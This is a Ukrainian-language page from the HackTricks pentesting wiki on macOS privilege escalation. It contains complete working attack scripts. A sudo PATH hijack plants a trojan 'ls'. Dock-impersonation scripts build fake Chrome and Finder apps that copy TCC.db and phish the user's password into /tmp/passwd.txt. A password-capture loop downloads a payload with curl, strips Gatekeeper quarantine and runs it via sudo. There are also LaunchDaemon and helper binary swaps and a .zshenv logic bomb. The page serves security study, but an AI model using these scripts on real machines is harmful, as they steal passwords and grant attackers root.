# Ескалація привілеїв у macOS

{{#include ../../banners/hacktricks-training.md}}

## Ескалація привілеїв через TCC

Якщо ви шукаєте інформацію про ескалацію привілеїв через TCC, перейдіть сюди:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Ескалація привілеїв у Linux

Багато методів ескалації привілеїв, які впливають на Linux та інші Unix-подібні системи, також працюють у macOS. Дивіться:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## Взаємодія з користувачем

### Sudo Hijacking

Оригінальний опис [техніки Sudo Hijacking наведено в статті про ескалацію привілеїв у Linux](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).

Однак macOS **зберігає** **`PATH`** користувача, коли він запускає **`sudo`**. Це означає, що інший спосіб здійснити цю атаку — **підмінити інші бінарні файли**, які жертва все одно запускає під час **використання sudo:**

```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
    whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```

Зверніть увагу, що користувач, який працює з терміналом, найімовірніше, має **Homebrew installed**. Тому можна hijack бінарні файли в **`/opt/homebrew/bin`**.

### Dock Impersonation

За допомогою **social engineering** можна, наприклад, **видавати себе за Google Chrome** у Dock і фактично виконувати власний скрипт:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Кілька пропозицій:

- Перевірте, чи є Chrome у Dock, і, якщо є, **видаліть** цей елемент і **додайте** **підроблений** елемент **Chrome на ту саму позицію** в масиві Dock.

<details>
<summary>Скрипт для Chrome Dock impersonation</summary>

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /Applications/Google\\\\ Chrome.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo $PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Деякі поради:

- Ви **не можете видалити Finder із Dock**, тож якщо збираєтеся додати його до Dock, можна розмістити підроблений Finder одразу поруч зі справжнім. Для цього потрібно **додати запис підробленого Finder на початок масиву Dock**.
- Інший варіант — не розміщувати його в Dock, а просто відкрити: «Finder просить керувати Finder» — це не так уже й дивно.
- Ще один варіант **підвищити привілеї до root без запиту** пароля, хоч і з жахливим діалоговим вікном, — змусити Finder справді запитати пароль для виконання привілейованої дії:
  - Попросіть Finder скопіювати до **`/etc/pam.d`** новий файл **`sudo`** (у запиті пароля буде вказано, що «Finder хоче скопіювати sudo»).
  - Попросіть Finder скопіювати новий **Authorization Plugin** (можна задати ім’я файлу так, щоб у запиті пароля було вказано: «Finder хоче скопіювати Finder.bundle»).

<details>
<summary>Скрипт імітації Finder у Dock</summary>

```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /System/Library/CoreServices/Finder.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo $PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Finder</string>
    <key>CFBundleIdentifier</key>
    <string>com.apple.finder</string>
    <key>CFBundleName</key>
    <string>Finder</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

</details>

{{#endtab}}
{{#endtabs}}

### Фішинг через запит пароля + повторне використання sudo

Malware часто зловживає взаємодією з користувачем, щоб **викрасти пароль, що дає змогу використовувати sudo**, і повторно застосувати його програмно. Типовий сценарій:

1. Визначити користувача, який увійшов у систему, за допомогою `whoami`.
2. **Повторювати запити пароля в циклі**, доки `dscl . -authonly "$user" "$pw"` не завершиться успішно.
3. Кешувати облікові дані (наприклад, у `/tmp/.pass`) і виконувати привілейовані дії за допомогою `sudo -S` (передача пароля через stdin).

Приклад мінімального ланцюжка:

```bash
user=$(whoami)
while true; do
  read -s -p "Password: " pw; echo
  dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```

Викрадений пароль можна повторно використати, щоб **зняти карантин Gatekeeper за допомогою `xattr -c`**, скопіювати LaunchDaemons або інші привілейовані файли та запускати додаткові етапи без взаємодії з користувачем.<sup>[[1]](#references)</sup>

#### Перевірка перехоплених паролів через PAM

У вікні запиту, схожому на системне, із захищеним текстовим полем можна зібрати пароль облікового запису-кандидата та перевірити його в тому самому процесі через PAM, не запускаючи `dscl`, `security` або `osascript`. Викликаючий код починає транзакцію PAM за допомогою `pam_start`, передає введений пароль через callback-функцію діалогу, викликає `pam_authenticate` і завершує транзакцію за допомогою `pam_end`. Якщо перевірка не пройшла, можна повернутися до поля пароля; успішна перевірка підтверджує пароль без запуску окремого процесу для перевірки. Сама автентифікація PAM **не** підвищує привілеї викликаючого коду й не надає дозволу на привілейовані операції.<sup>[[9]](#references)[[10]](#references)</sup>

Якщо пароль для входу збігається з паролем Keychain, перехоплений пароль також може підійти для операцій, що вимагають поточного пароля Keychain; див. [обмеження ACL і списку розділів Keychain](../macos-red-teaming/macos-keychain.md).<sup>[[10]](#references)</sup>

## Новіші вектори, специфічні для macOS (2023–2026)

### Застарілий `AuthorizationExecuteWithPrivileges` досі працює

`AuthorizationExecuteWithPrivileges` визнано застарілим у версії 10.7, але він **досі працює на Sonoma/Sequoia**. Багато комерційних програм оновлення викликають `/usr/libexec/security_authtrampoline`, передаючи шлях, якому не можна довіряти. Якщо цільовий бінарний файл доступний для запису користувачу, можна підкласти троян і скористатися легітимним запитом на авторизацію:

```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```

Поєднайте це з **описаними вище трюками маскування**, щоб показати правдоподібне діалогове вікно пароля.


### Тріаж привілейованого helper / XPC

Багато сучасних сторонніх macOS privescs дотримуються тієї самої схеми: **root LaunchDaemon** надає **Mach/XPC service** з **`/Library/PrivilegedHelperTools`**, а helper або **не перевіряє клієнта**, або робить це **запізно** (PID race), або надає **root method**, що використовує **контрольований користувачем шлях/скрипт**. Саме цей клас вразливостей лежить в основі багатьох нещодавніх проблем із helper у VPN-клієнтах, ігрових лаунчерах і програмах оновлення.<sup>[[2]](#references)</sup>

Короткий контрольний список для тріажу:

```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
  echo "== $f =="
  codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
  strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```

Звертайте особливу увагу на допоміжні програми, які:

- продовжують приймати запити **після видалення**, бо завдання залишилося завантаженим у `launchd`
- виконують скрипти або читають конфігурацію з **`/Applications/...`** чи інших шляхів, доступних для запису непривілейованим користувачам
- покладаються на перевірку peer за **PID** або лише за **bundle-id**, яку можна обійти через race condition

Докладніше про помилки авторизації допоміжних програм див. [на цій сторінці](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### Успадкування середовища скриптами PackageKit (CVE-2024-27822)

До виправлення Apple у **Sonoma 14.5**, **Ventura 13.6.7** і **Monterey 12.7.5** під час встановлення, ініційованого користувачем через **`Installer.app`** / **`PackageKit.framework`**, скрипти PKG могли виконуватися від імені root у середовищі поточного користувача. Це означає, що пакет із **`#!/bin/zsh`** завантажував би **`~/.zshenv`** зловмисника й виконував його від імені **root**, коли жертва встановлювала пакет.<sup>[[3]](#references)</sup>

Це особливо цікаво як **logic bomb**: достатньо закріпитися в обліковому записі користувача й отримати доступ до файлу запуску оболонки для запису, а потім чекати, поки користувач запустить будь-який вразливий інсталятор на **zsh**. Зазвичай це **не** стосується розгортань через **MDM/Munki**, оскільки вони виконуються в середовищі користувача root.<sup>[[3]](#references)</sup>

```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```

Якщо хочете детальніше розібрати зловживання, специфічні для installer, перегляньте також [цю сторінку](macos-files-folders-and-binaries/macos-installers-abuse.md).

### Колізія шляху призначення installer через `.localized`

Деякі сторонні installers реєструють root LaunchDaemon, виконуваний файл якого вказано за фіксованим шляхом усередині `/Applications/Target.app`. Якщо зловмисник може спершу створити цей bundle з **іншим ідентифікатором bundle**, Installer може зберегти підставний bundle і розмістити справжній застосунок у `/Applications/Target.localized/Target.app`. Демон і далі вказуватиме на початковий шлях. Тож підконтрольний зловмиснику виконуваний файл усередині підставного bundle згодом може запуститися з правами root.<sup>[[8]](#references)</sup>

Важливі попередні умови:<sup>[[8]](#references)</sup>

1. Зловмисник може створити очікуваний шлях до застосунку або контролювати його.
2. Пакет не видаляє конфліктний bundle.
3. Привілейоване завдання використовує жорстко заданий шлях усередині цього bundle.
4. Користувач або робочий процес MDM встановлює пакет і реєструє завдання.

Знайдіть переміщені bundles, а потім перевірте цілі LaunchDaemon за допомогою циклу переліку з наступного розділу:<sup>[[8]](#references)</sup>

```bash
find /Applications -type d -name '*.localized' -prune -print
for app in /Applications/*.app; do
  [ -d "$app" ] && stat -f '%Su:%Sg %Sp %N' "$app"
done
```

Безпечніший інсталятор визначає кінцеве розташування bundle і зберігає привілейовані виконувані файли в розташуванні, власником якого є root, наприклад `/Library/PrivilegedHelperTools`. Він також має перевіряти власника й підпис коду перед реєстрацією або запуском завдання.<sup>[[8]](#references)</sup>

### Підміна цілі LaunchDaemon, доступної для запису

Plist-файл LaunchDaemon може належати root, але його `Program` або перший елемент `ProgramArguments` може вказувати на каталог, доступний для запису користувачеві. Перевіряйте **весь шлях**, а не лише права на виконуваний файл. Якщо батьківський каталог доступний для запису, зловмисник може перейменувати виконуваний файл, що належить root, і створити заміну за тим самим шляхом. Заміна запуститься від імені root під час наступного запуску завдання. Для цього достатньо перезавантажити систему або звичайним чином перезапустити службу. Зловмиснику не потрібен дозвіл на запуск `launchctl bootstrap` у системному домені.<sup>[[7]](#references)</sup>

Спочатку перевірте кожну ціль і її безпосередній батьківський каталог:<sup>[[7]](#references)</sup>

```bash
for p in /Library/LaunchDaemons/*.plist; do
  target=$(plutil -extract Program raw -o - "$p" 2>/dev/null)
  [ -n "$target" ] ||
    target=$(plutil -extract ProgramArguments.0 raw -o - "$p" 2>/dev/null)
  [ -n "$target" ] || continue
  printf '\n%s -> %s\n' "$p" "$target"
  ls -ld "$target" "$(dirname "$target")" 2>/dev/null
done
```

Коли файл або його батьківський каталог доступний для запису, збережіть оригінальний бінарний файл і замініть його за цим шляхом на виконуваний payload. Потім дочекайтеся перезапуску вже завантаженого демона.<sup>[[7]](#references)</sup>

```bash
target=/path/from/the/plist
mv "$target" "$target.real"
cp /tmp/payload "$target"
chmod 755 "$target"
```

### Гонка вказівника облікових даних XNU SMR (CVE-2025-24118)

У вразливому шляху `kauth_cred_proc_update` значення `proc_ro.p_ucred` оновлювалося за допомогою неатомарного API `zalloc_ro_mut`, тоді як читачі SMR завантажували вказівник без блокування. Публічний спосіб відтворення використовує спеціально підготовлений бінарний файл setgid. Один потік перемикається між реальним і ефективним ідентифікаторами груп, а інший багаторазово виконує syscall, наприклад `getgid()`.<sup>[[4]](#references)</sup>

```c
// Writer thread inside a setgid binary
while (1) {
    setgid(real_gid);
    setgid(effective_gid);
}
// Reader thread
while (1) observed_gid = getgid();
```

Розглядайте це як **примітив для гонки**, а не як готовий root-експлойт. Опублікований PoC демонструє пошкодження вказівника облікових даних. Зазвичай це закінчується панікою ядра. Дослідник відтворив пошкодження лише на Intel і не забезпечив детермінованого контролю над отриманим об’єктом облікових даних. В macOS 15.3 Apple замінила оновлення на атомарний обмін вказівниками.<sup>[[4]](#references)</sup>

### Обхід SIP через Migration Assistant («Migraine», CVE-2023-32369)

Навіть якщо у вас уже є root, SIP усе одно блокує запис у системні розташування. Вразливість **Migraine** використовує entitlement Migration Assistant `com.apple.rootless.install.heritable`, щоб запустити дочірній процес, який успадковує можливість обходу SIP і перезаписує захищені шляхи (наприклад, `/System/Library/LaunchDaemons`).<sup>[[5]](#references)</sup> Ланцюжок дій:

1. Отримайте root у запущеній системі.
2. Передайте `systemmigrationd` спеціально сформований стан, щоб запустити контрольований зловмисником бінарний файл.
3. Використайте успадкований entitlement, щоб змінити файли, захищені SIP; зміни зберігаються навіть після перезавантаження.

### Контрабанда виразів NSPredicate/XPC (клас вразливостей CVE-2023-23530/23531)

Кілька демонів Apple приймають об’єкти **NSPredicate** через XPC і перевіряють лише поле `expressionType`, яким може керувати зловмисник. Створивши predicate, що виконує довільні селектори, можна досягти **виконання коду в root/system XPC-службах** (наприклад, `coreduetd`, `contextstored`). У поєднанні з початковим виходом із пісочниці застосунку це дає змогу **підвищити привілеї без запитів до користувача**. Шукайте кінцеві точки XPC, які десеріалізують predicates і не мають надійного visitor.<sup>[[6]](#references)</sup>

## TCC — Підвищення привілеїв до root

### CVE-2020-9771 — обхід TCC через mount_apfs і підвищення привілеїв

**Будь-який користувач** (навіть без привілеїв) може створити й змонтувати знімок Time Machine із параметром `-o noowners` і **отримати доступ до ВСІХ файлів** цього знімка, обходячи перевірки власника на активному томі. Потрібно лише, щоб застосунок (наприклад, `Terminal`) мав **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`).

Команди та повне пояснення наведено на сторінці обходів TCC:

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Конфіденційна інформація

Це може стати в пригоді для підвищення привілеїв:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}



{{#include ../../banners/hacktricks-training.md}}

## References

- [1] [Pentest Partners — 2025: рік Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [CVE-2024-30165: локальне підвищення привілеїв у AWS Client VPN для macOS](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
- [3] [CVE-2024-27822: підвищення привілеїв через macOS PackageKit](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [TRAVERTINE: CVE-2025-24118](https://jprx.io/cve-2025-24118/)
- [5] [Обхід SIP через «Migraine» від Microsoft (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [6] [Центр передових досліджень Trellix — новий клас вразливостей для підвищення привілеїв у macOS та iOS (CVE-2023-23530/23531)](https://www.trellix.com/en-sg/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)
- [7] [Перехоплення LaunchDaemon: підвищення привілеїв і закріплення в системі через ненадійні дозволи на папки](https://bradleyjkemp.dev/post/launchdaemon-hijacking/)
- [8] [Локальне підвищення привілеїв у macOS через каталог .localized](https://theevilbit.github.io/posts/localized/)
- [9] [Jamf Threat Labs — PamStealer: шкідливе ПЗ для macOS, що видає себе за застосунок для керування буфером обміну](https://www.jamf.com/blog/pamstealer-macos-infostealer-applescript-rust/)
- [10] [Kaspersky Securelist — детальний аналіз MacSync](https://securelist.com/macsync-new-version/121383/)
